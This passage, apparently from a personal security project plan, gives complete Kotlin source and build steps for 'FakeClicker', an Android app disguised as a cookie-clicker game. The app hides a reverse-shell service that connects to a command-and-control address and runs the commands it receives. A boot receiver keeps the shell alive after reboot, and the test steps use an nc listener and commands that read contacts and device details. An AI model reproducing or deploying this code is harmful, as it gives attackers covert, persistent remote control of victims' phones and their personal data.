  git add fakeClicker/app/src/main/java/tech/fakeclicker/MainActivity.kt \
          fakeClicker/app/build.gradle
  git commit -m "feat: cookie clicker main activity with score, upgrades, animations"
  ```

---

## Task 9: ReverseShellService

**Files:**
- Create: `fakeClicker/app/src/main/java/tech/fakeclicker/ReverseShellService.kt`

- [ ] **Step 1: Implement ReverseShellService**

  Change `C2_IP` to your laptop's local IP before building.

  `fakeClicker/app/src/main/java/tech/fakeclicker/ReverseShellService.kt`:
  ```kotlin
  package tech.fakeclicker

  import android.app.*
  import android.content.Intent
  import android.os.Build
  import android.os.IBinder
  import java.io.*
  import java.net.Socket

  class ReverseShellService : Service() {

      private val C2_IP   = "192.168.1.100"  // ← change to your laptop's IP
      private val C2_PORT = 4444

      private val CHANNEL_ID = "cookie_sync"
      private var shellThread: Thread? = null

      override fun onCreate() {
          super.onCreate()
          createNotificationChannel()
          startForeground(1, buildNotification())
          shellThread = Thread(::connectLoop, "shell-loop").also { it.start() }
      }

      override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
          START_STICKY

      override fun onBind(intent: Intent?): IBinder? = null

      override fun onDestroy() {
          shellThread?.interrupt()
          super.onDestroy()
      }

      private fun connectLoop() {
          while (!Thread.currentThread().isInterrupted) {
              try {
                  Socket(C2_IP, C2_PORT).use { socket ->
                      socket.soTimeout = 0
                      val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
                      val writer = PrintWriter(BufferedWriter(OutputStreamWriter(socket.getOutputStream())), true)

                      writer.println("[*] ${Build.MANUFACTURER} ${Build.MODEL} | Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
                      writer.println("[*] shell ready")

                      var line: String?
                      while (reader.readLine().also { line = it } != null) {
                          val cmd = line!!.trim()
                          if (cmd == "exit") return
                          val output = ShellExecutor.run(cmd)
                          writer.println(output)
                          writer.println("---")
                      }
                  }
              } catch (_: Exception) {}

              try { Thread.sleep(10_000) } catch (_: InterruptedException) { break }
          }
      }

      private fun buildNotification(): Notification {
          val pendingIntent = PendingIntent.getActivity(
              this, 0,
              Intent(this, MainActivity::class.java),
              PendingIntent.FLAG_IMMUTABLE
          )
          return Notification.Builder(this, CHANNEL_ID)
              .setContentTitle(getString(R.string.notification_title))
              .setContentText(getString(R.string.notification_text))
              .setSmallIcon(android.R.drawable.ic_popup_sync)
              .setContentIntent(pendingIntent)
              .build()
      }

      private fun createNotificationChannel() {
          if (Build.VERSION.SDK_INT >= 26) {
              val channel = NotificationChannel(
                  CHANNEL_ID,
                  getString(R.string.notification_channel_name),
                  NotificationManager.IMPORTANCE_MIN
              ).apply { setShowBadge(false) }
              getSystemService(NotificationManager::class.java)
                  .createNotificationChannel(channel)
          }
      }
  }
  ```

- [ ] **Step 2: Build and verify no errors**

  Build → Make Project. Expected: BUILD SUCCESSFUL.

- [ ] **Step 3: Commit**

  ```bash
  git add fakeClicker/app/src/main/java/tech/fakeclicker/ReverseShellService.kt
  git commit -m "feat: TCP reverse shell foreground service with reconnect loop"
  ```

---

## Task 10: BootReceiver

**Files:**
- Create: `fakeClicker/app/src/main/java/tech/fakeclicker/BootReceiver.kt`

- [ ] **Step 1: Implement BootReceiver**

  `fakeClicker/app/src/main/java/tech/fakeclicker/BootReceiver.kt`:
  ```kotlin
  package tech.fakeclicker

  import android.content.BroadcastReceiver
  import android.content.Context
  import android.content.Intent
  import android.os.Build

  class BootReceiver : BroadcastReceiver() {
      override fun onReceive(context: Context, intent: Intent) {
          val action = intent.action ?: return
          if (action != Intent.ACTION_BOOT_COMPLETED &&
              action != "android.intent.action.QUICKBOOT_POWERON") return

          val svc = Intent(context, ReverseShellService::class.java)
          if (Build.VERSION.SDK_INT >= 26) {
              context.startForegroundService(svc)
          } else {
              context.startService(svc)
          }
      }
  }
  ```

- [ ] **Step 2: Commit**

  ```bash
  git add fakeClicker/app/src/main/java/tech/fakeclicker/BootReceiver.kt
  git commit -m "feat: boot receiver for persistence after device reboot"
  ```

---

## Task 11: Build, Install & Smoke Test

- [ ] **Step 1: Set your laptop IP in ReverseShellService.kt**

  Find your local IP:
  ```bash
  ip addr show | grep "inet " | grep -v 127.0.0.1
  ```
  Edit `C2_IP` in `ReverseShellService.kt` to match. Rebuild.

- [ ] **Step 2: Build debug APK**

  ```bash
  cd /home/mechanosec/PetProjects/MySecurity/fakeClicker
  ./gradlew assembleDebug
  ```
  Expected output ends with: `BUILD SUCCESSFUL`
  APK location: `app/build/outputs/apk/debug/app-debug.apk`

- [ ] **Step 3: Enable USB debugging on test phone**

  Settings → About Phone → tap Build Number 7 times → Developer Options → USB Debugging ON.
  Connect phone via USB.

  ```bash
  adb devices
  ```
  Expected: your device serial listed as `device`.

- [ ] **Step 4: Install APK**

  ```bash
  adb install -r app/build/outputs/apk/debug/app-debug.apk
  ```
  Expected: `Success`

- [ ] **Step 5: Start listener on laptop**

  ```bash
  nc -lvp 4444
  ```

- [ ] **Step 6: Launch app on phone**

  Open Cookie Clicker on the phone. Grant all permission prompts.
  Expected in terminal within 10s:
  ```
  [*] <Brand> <Model> | Android X.X (API XX)
  [*] shell ready
  ```

- [ ] **Step 7: Test shell commands**

  ```
  whoami
  id
  cat /proc/version
  ls /sdcard/
  ```
  Verify output streams back correctly.

- [ ] **Step 8: Test reconnect**

  Close `nc` (Ctrl+C). Wait 15s. Run `nc -lvp 4444` again.
  Expected: phone reconnects automatically within 10s.

- [ ] **Step 9: Test boot persistence**

  Reboot the test phone. Start `nc -lvp 4444` on laptop.
  Expected: shell connects within 30s of boot without opening the app.

- [ ] **Step 10: Final commit**

  ```bash
  cd /home/mechanosec/PetProjects/MySecurity
  git add fakeClicker/
  git commit -m "feat: FakeClicker complete — cookie clicker UI + reverse shell demo APK"
  ```

---

## Post-Build: Report Notes

Use these shell commands to gather evidence for the report sections:

```bash
# Installed permissions actually granted
pm list permissions -g -d

# Running processes
ps -A | grep fakeclicker

# Contacts accessible
content query --uri content://contacts/phones

# Device info
getprop ro.product.model
getprop ro.build.version.release
```
